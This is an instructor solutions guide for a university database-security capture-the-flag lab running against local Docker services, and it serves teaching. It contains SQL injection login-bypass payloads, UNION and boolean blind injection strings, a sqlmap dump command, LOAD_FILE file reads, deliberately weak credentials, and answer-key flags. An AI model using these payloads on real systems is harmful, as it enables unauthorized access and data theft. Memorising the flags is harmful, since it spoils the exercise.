# Instructor Solutions Guide
## Database Security CTF Lab

**Course:** Database Security
**Target:** Year 4 Students
**Duration:** 4-5 hours
**Difficulty:** Progressive (Easy → Expert)

---

## Table of Contents
1. [Setup & Preparation](#setup--preparation)
2. [Solutions by Phase](#solutions-by-phase)
3. [Common Student Mistakes](#common-student-mistakes)
4. [Grading Rubric](#grading-rubric)
5. [Teaching Tips](#teaching-tips)

---

## Setup & Preparation

### Before Class

```bash
# 1. Generate flags
cd flag-generator
python generate_flags.py

# 2. Save flags.json for reference
cp ../flags.json solutions/current_flags.json

# 3. Start environment
cd ..
docker-compose up -d

# 4. Verify all services running
docker-compose ps

# 5. Test Challenge 1 manually
mysql -h localhost -P 3306 -u ctf_user -p
# Password from .env file
```

### Get MySQL Password
```bash
# Windows
type .env | findstr MYSQL_PASSWORD

# Result will show:
# MYSQL_PASSWORD=<random_password>
```

### Expected Flags Format
All flags follow pattern: `FLAG{20_character_hex}`

Example: `FLAG{e5150ce158612707447d}`

---

##Solutions by Phase

### PHASE 1: RECONNAISSANCE (30 minutes)

#### Challenge 1: Network Scanning & Port Discovery (100 pts)

**Objective:** Identify MySQL service and get flag from `system_info.service_banner`

**Solution:**

```bash
# Method 1: Using nmap
nmap -sV -p 3306 localhost

# Method 2: Direct MySQL connection
mysql -h localhost -P 3306 -u ctf_user -p
# Enter password from .env

# In MySQL:
USE ctf_database;
SELECT * FROM system_info WHERE info_key = 'service_banner';
```

**Expected Output:**
```
+----+-----------------+---------------------------+
| id | info_key        | info_value                |
+----+-----------------+---------------------------+
|  1 | service_banner  | FLAG{e5150ce158612707447d}|
+----+-----------------+---------------------------+
```

**Flag:** From `flags.json` challenge ID 1

**Common Mistakes:**
- Students forget to use `-sV` flag in nmap
- Connect without checking `.env` for password
- Query wrong table (users instead of system_info)

**Teaching Moment:** Explain banner grabbing importance in reconnaissance

---

#### Challenge 2: Database Version & Banner Grabbing (100 pts)

**Objective:** Extract MySQL version and get flag from `system_info.db_version`

**Solution:**

```bash
mysql -h localhost -P 3306 -u ctf_user -p

# Method 1: Built-in function
SELECT VERSION();

# Method 2: System variable
SELECT @@version;

# Method 3: Flag location
SELECT * FROM system_info WHERE info_key = 'db_version';
```

**Flag:** From `flags.json` challenge ID 2

**Common Mistakes:**
- Only check VERSION() and miss the flag in table
- Confused between server version and schema version

**Teaching Moment:** Different ways to fingerprint databases

---

### PHASE 2: MISCONFIGURATION DISCOVERY (45 minutes)

#### Challenge 3: Weak Credentials Discovery (100 pts)

**Objective:** Find user with weak password and get flag from `users.welcome_flag`

**Solution:**

```bash
# Step 1: Try common credentials
mysql -h localhost -P 3306 -u backup -pbackup123

# Step 2: After successful login
USE ctf_database;
SELECT * FROM users WHERE welcome_flag IS NOT NULL;
```

**Alternatively using AI tool:**
```bash
cd ai-helpers
python wordlist_generator.py --fallback
# Will generate mysql_passwords.txt with common passwords

# Try each password:
mysql -h localhost -u backup -p<password>
```

**Flag:** From `flags.json` challenge ID 3

**Weak Credentials Created:**
- Username: `backup`
- Password: `backup123`

**Common Mistakes:**
- Only try `root` user
- Don't check `mysql.user` table first
- Give up after 2-3 attempts

**Teaching Moment:**
- Default credentials are #1 vulnerability
- Importance of password policies
- How attackers enumerate users

---

#### Challenge 4: Excessive Privileges Detection (150 pts)

**Objective:** Audit user privileges and find flag in `user_privileges` table

**Solution:**

```bash
mysql -h localhost -P 3306 -u ctf_user -p

# Step 1: Check current user privileges
SHOW GRANTS;

# Step 2: Check all MySQL users
SELECT User, Host, File_priv, Super_priv, Grant_priv
FROM mysql.user;

# Step 3: Find flag
SELECT * FROM user_privileges
WHERE privilege_type = 'FILE';
```

**Alternatively using AI tool:**
```bash
cd ai-helpers
python config_auditor.py --user ctf_user --password <from .env>
# Will show privilege audit with flag
```

**Flag:** From `flags.json` challenge ID 4

**Key Finding:** `ctf_user` has FILE privilege (dangerous!)

**Common Mistakes:**
- Don't know difference between FILE, SUPER, GRANT privileges
- Only check SHOW GRANTS FOR CURRENT_USER
- Miss the user_privileges table

**Teaching Moment:**
- Principle of Least Privilege
- FILE privilege = can read ANY file
- Why GRANT privilege is dangerous

---

#### Challenge 5: Insecure Configuration Audit (150 pts)

**Objective:** Find MySQL misconfigurations and get flag from `config_audit` table

**Solution:**

```bash
mysql -h localhost -P 3306 -u ctf_user -p

# Step 1: Check critical variables
SHOW VARIABLES LIKE '%secure_file%';
SHOW VARIABLES LIKE '%local_infile%';
SHOW VARIABLES LIKE '%general_log%';

# Step 2: Find flag
SELECT * FROM config_audit
WHERE risk_level = 'CRITICAL';
```

**AI Tool Method:**
```bash
python config_auditor.py --user ctf_user --password <from .env> --report audit.json
# Automatically audits and shows flag
```

**Flag:** From `flags.json` challenge ID 5

**Critical Misconfigurations:**
- `secure_file_priv` = "" (should be `/var/lib/mysql-files/`)
- `local_infile` = ON (should be OFF)

**Common Mistakes:**
- Don't know which variables are security-critical
- Only check one variable
- Don't understand implications

**Teaching Moment:**
- MySQL security hardening
- Attack surface from misconfigurations
- How to audit production databases

---

### PHASE 3: PRIVILEGE ESCALATION (1 hour)

#### Challenge 6: Horizontal Privilege Escalation (200 pts)

**Objective:** Access other users' private data via IDOR vulnerability

**Solution:**

```bash
# Step 1: Navigate to profile page
http://localhost:8080/index.php?page=profile&user_id=1

# Step 2: Try different user_id values
http://localhost:8080/index.php?page=profile&user_id=2
http://localhost:8080/index.php?page=profile&user_id=3
http://localhost:8080/index.php?page=profile&user_id=4

# Step 3: Find user with secret_key field populated
# User ID 2 (Jane Smith) has the flag

# Alternative: Direct SQL
mysql> SELECT * FROM user_secrets WHERE user_id = 2;
```

**Flag:** From `flags.json` challenge ID 6 (in user_id=2's secret_key)

**Vulnerability:**
- `profile.php` uses `$_GET['user_id']` directly in SQL
- No authorization check
- Classic IDOR (Insecure Direct Object Reference)

**Common Mistakes:**
- Only check user_id=1
- Don't notice the user_id parameter in URL
- Think they need SQLi (it's simpler than that!)

**Teaching Moment:**
- Horizontal vs Vertical privilege escalation
- IDOR is OWASP Top 10
- Always implement authorization checks

---

#### Challenge 7: Vertical Privilege Escalation via Stored Procedures (250 pts)

**Objective:** Call admin-only stored procedure that runs with root privileges

**Solution:**

```bash
mysql -h localhost -P 3306 -u ctf_user -p

# Step 1: List stored procedures
SHOW PROCEDURE STATUS WHERE Db = 'ctf_database';

# Step 2: Check procedure definition
SHOW CREATE PROCEDURE get_admin_flag;

# Key finding: DEFINER=root@localhost SQL SECURITY DEFINER
# This means it runs with ROOT privileges!

# Step 3: Call the procedure
CALL get_admin_flag();
```

**Expected Output:**
```
+---------------------------+--------------------------------+
| admin_flag                | message                        |
+---------------------------+--------------------------------+
| FLAG{17bdca681327ccef9511}| Privilege Escalation Successful|
+---------------------------+--------------------------------+
```

**Flag:** From `flags.json` challenge ID 7

**Vulnerability:**
- Stored procedure has `DEFINER=root`
- Runs with elevated privileges
- Low-privilege user can execute it

**Common Mistakes:**
- Don't know how to list procedures
- Don't understand DEFINER clause
- Try to modify procedure instead of calling it

**Teaching Moment:**
- SQL DEFINER security model
- Stored procedures as privilege escalation vector
- Real-world: UDF exploits in MySQL

---

### PHASE 4: INJECTION ATTACKS (1.5 hours)

#### Challenge 8: Authentication Bypass via SQL Injection (200 pts)

**Objective:** Bypass login form using classic SQLi

**Solution:**

**Manual Method:**
```
1. Go to: http://localhost:8080/index.php?page=login

2. Enter credentials:
   Username: admin' OR '1'='1' --
   Password: (anything)

3. Click Login

4. After bypass, you're logged in as admin

5. Check admin panel or query directly:
mysql> SELECT * FROM admin_panel;
```

**Alternative payloads:**
```
admin' #
admin' OR 1=1 --
' OR '1'='1
admin'-- -
```

**Direct SQL Method:**
```bash
mysql> SELECT * FROM admin_panel WHERE username = 'admin';
# Shows the flag in secret_key column
```

**Flag:** From `flags.json` challenge ID 8

**Vulnerability:**
```php
// In login.php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = MD5('$password')";
```

**Common Mistakes:**
- Forget the `--` comment marker
- Put space after `--` (need `-- ` with space)
- Try complex payloads when simple works
- Don't check admin_panel table after bypass

**Teaching Moment:**
- Why prepared statements are essential
- How SQLi breaks authentication logic
- Reading and understanding vulnerable code

---

#### Challenge 9: Blind SQL Injection & Data Exfiltration (300 pts)

**Objective:** Extract `hidden_flag` from products table using blind SQLi

**Solution:**

**Method 1: UNION-based (easier)**
```
http://localhost:8080/index.php?page=product_detail&id=1 UNION SELECT 1,2,hidden_flag,4,5,6 FROM products--
```

**Method 2: Boolean-based blind**
```
# Test true condition
id=1 AND 1=1

# Test false condition
id=1 AND 1=2

# Extract first character
id=1 AND SUBSTRING((SELECT hidden_flag FROM products LIMIT 1),1,1)='F'
```

**Method 3: sqlmap (automated)**
```bash
sqlmap -u "http://localhost:8080/index.php?page=product_detail&id=1" \
       --dump -T products -C hidden_flag
```

**Method 4: AI-optimized script**
```bash
cd ai-helpers
python blind_sqli_optimizer.py \
  --target http://localhost:8080/index.php?page=product_detail \
  --param id
```

**Flag:** From `flags.json` challenge ID 9

**Common Mistakes:**
- Don't understand UNION SELECT column count
- Forget `--` at end of payload
- Give up on manual extraction (use AI tool!)
- Wrong column numbers in UNION

**Teaching Moment:**
- Blind SQLi techniques
- When to use automation
- AI can speed up exploitation significantly

**Time Comparison:**
- Manual boolean-based: ~20-30 minutes
- UNION-based: ~2 minutes
- sqlmap: ~5 minutes
- AI-optimized: ~3 minutes

---

### PHASE 5: KEY EXTRACTION (45 minutes)

#### Challenge 10: Master Key Extraction via Multi-Stage Attack (250 pts)

**Objective:** Combine all techniques to reconstruct master key from 3 parts

**Solution:**

**Part 1: File Read (requires FILE privilege from Challenge 4)**
```bash
mysql> SELECT * FROM file_references WHERE file_type = 'secret';
# Shows: /var/lib/mysql/secret_part1.txt

mysql> SELECT LOAD_FILE('/var/lib/mysql/secret_part1.txt');
# OR check file_references.content column
# Result: KEY_PART_1: e68df663d998
```

**Part 2: Log Analysis**
```bash
mysql> SELECT * FROM audit_log WHERE action = 'master_key_fragment';
# Result: KEY_PART_2: 8e4f0cb7abc1
```

**Part 3: Trigger Enumeration**
```bash
mysql> SHOW TRIGGERS;
mysql> SHOW CREATE TRIGGER master_key_trigger;
# Look for comment: -- Master Key Part 3: def234567890
# Result: KEY_PART_3: def234567890
```

**Reconstruct Final Flag:**
```
Part 1: e68df663d998
Part 2: 8e4f0cb7abc1
Part 3: def234567890

Final Flag: FLAG{e68df663d9988e4f0cb7abc1def234567890}
```

**Using AI Tool (Automated):**
```bash
cd ai-helpers
python log_analyzer.py --user ctf_user --password <from .env>
# Automatically extracts all 3 parts and reconstructs flag
```

**Common Mistakes:**
- Don't realize flag is split
- Miss one of the 3 sources
- Don't know how to read file with LOAD_FILE
- Forget to check triggers
- Combine parts in wrong order

**Teaching Moment:**
- Multi-stage attacks require all previous knowledge
- Real pentests involve combining multiple techniques
- Importance of thorough enumeration
- How AI can correlate data from multiple sources

---

## Common Student Mistakes

### Technical Mistakes
1. **Wrong passwords** - Not checking .env file
2. **SQL syntax errors** - Forgetting `;` or `--` comments
3. **Wrong tables** - Querying users instead of system_info
4. **Case sensitivity** - MySQL table names on Linux
5. **Special characters** - Not escaping quotes in SQL

### Conceptual Mistakes
1. **Skipping phases** - Trying Challenge 10 without doing 1-9
2. **Not reading hints** - Each challenge has 3-4 progressive hints
3. **Over-complicating** - Using advanced techniques when simple works
4. **Not documenting** - Forgetting to save commands/screenshots
5. **Giving up too early** - Not using AI tools when stuck

### Time Management
1. Spending 2 hours on Challenge 1 (should be 15 min)
2. Not using estimated times as guideline
3. Skipping reconnaissance phases
4. Rushing final challenge

---

## Grading Rubric

### Flag Submissions (40 points)
- Each flag correct: 4 points
- Partial credit if close: 2 points
- No flag: 0 points

### Methodology (20 points)
- Followed pentest phases: 10 points
- Used appropriate tools: 5 points
- Documented process: 5 points

### AI Integration (15 points)
- Used at least 2 AI tools: 10 points
- Explained AI outputs: 5 points

### Report Quality (15 points)
- Clear findings: 5 points
- Screenshots/evidence: 5 points
- Professional format: 5 points

### Time Management (10 points)
- Completed in 4-5 hours: 10 points
- Completed in 6 hours: 7 points
- Over 6 hours: 5 points

**Total: 100 points**

**Bonus:** +10 points for finding unintended solutions

---

## Teaching Tips

### Before Lab
- Do a 15-minute overview of pentest workflow
- Show students where to find `.env` file
- Demonstrate Challenge 1 solution
- Explain flag format

### During Lab
- Monitor progress every 30 minutes
- Give hints to stuck students (don't give answers)
- Encourage AI tool usage
- Remind about time estimates

### Common Questions & Answers

**Q: "I can't connect to MySQL"**
A: Check Docker is running, check password from .env

**Q: "Is this the right flag format?"**
A: Yes, all flags are `FLAG{20_hex_characters}`

**Q: "Can I use Google?"**
A: Yes! Real pentesters use Google

**Q: "My AI tool isn't working"**
A: Use fallback mode with `--fallback` flag

**Q: "How many flags total?"**
A: 10 flags, one per challenge

### After Lab
- Debrief session: What was hardest?
- Show intended solutions
- Discuss real-world applications
- Review how AI helped

---

## Solution Validation

### Quick Check All Flags
```bash
# Check flags.json
cat flags.json | grep '"flag"'

# Expected: 10 unique flags
```

### Test Each Challenge
```bash
# Run through all challenges manually
# Or use automated test script:
cd solutions
# ./test_all_challenges.sh  # TODO: Create this
```

---

## Emergency Troubleshooting

### Reset Everything
```bash
docker-compose down -v
cd flag-generator
python generate_flags.py
cd ..
docker-compose up -d
```

### Check Container Logs
```bash
docker-compose logs mysql | grep ERROR
docker-compose logs ctf-platform | grep ERROR
```

### Verify Database
```bash
docker exec -it ctf-mysql mysql -uroot -p<root_pass> -e "SHOW DATABASES;"
```

---

**Good Luck Teaching! 🎓**

For questions or issues, check:
- [IMPLEMENTATION_STATUS.md](../IMPLEMENTATION_STATUS.md)
- [TESTING_GUIDE.md](../TESTING_GUIDE.md)
- [WHAT_WE_BUILT.md](../WHAT_WE_BUILT.md)
